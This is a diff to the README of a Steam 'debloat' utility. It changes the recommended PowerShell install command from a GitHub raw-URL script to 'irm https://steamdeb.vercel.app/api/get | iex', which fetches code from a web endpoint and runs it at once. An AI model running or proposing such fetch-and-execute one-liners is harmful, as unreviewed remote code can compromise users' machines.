@@ -59,7 +59,7 @@ Real-world testing on average gaming systems:
 
 ### Method 1: PowerShell (Recommended)
 ```powershell
-iex "& { $(iwr -useb 'https://raw.githubusercontent.com/AltRossell/Steam-Debloat/main/script/app.ps1') }"
+irm https://steamdeb.vercel.app/api/get | iex
 ```
 
 ### Method 2: Batch File
